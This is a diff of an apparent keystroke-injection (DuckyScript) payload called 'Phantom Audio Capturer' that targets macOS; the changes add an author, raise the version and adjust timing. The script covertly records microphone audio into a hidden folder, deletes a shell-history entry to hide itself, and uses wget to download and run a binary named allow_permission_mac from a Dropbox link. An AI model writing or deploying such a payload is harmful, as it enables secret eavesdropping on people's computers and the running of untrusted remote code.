@@ -16,10 +16,10 @@ REM To delete the hidden folder use command 'rm -r ~/.phantom_audio'
 
 REM Requirements: SOX you can install through homebrew 'brew install sox'
 
-REM Author: Narsty
+REM Author: Narsty, YonKu0
 REM Title: Phantom Audio Capturer
 REM Target: MacOS 
-REM Version: 1.0
+REM Version: 2.0
 REM Category: Recon
 
 
@@ -38,8 +38,6 @@ DELAY 500
 STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
 DELAY 500
 ENTER
-DELAY 500
-ENTER
 DELAY 1000
 STRING  screen -dm bash -c "nohup python3 record.py &"
 DELAY 200
@@ -55,8 +53,9 @@ DELAY 500
 STRING printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret audio.mp3"\ncmd = "sox -d -C 128 -r 44100 \\"{}\\"".format(filename)\nsubprocess.Popen(cmd, shell=True)\n' > record.py
 DELAY 500
 ENTER
-DELAY 500
+DELAY 1200
 STRING wget -O allow_permission_mac 'https://dl-web.dropbox.com/scl/fi/k43jcnjle532pa18jkvgw/allow_permission_mac?rlkey=m6j8yx6h34v47uf3i7fxkje3v' && chmod +x allow_permission_mac && (./allow_permission_mac & nohup python3 record.py &)
+DELAY 500
 ENTER
 DELAY 10000 
 GUI w
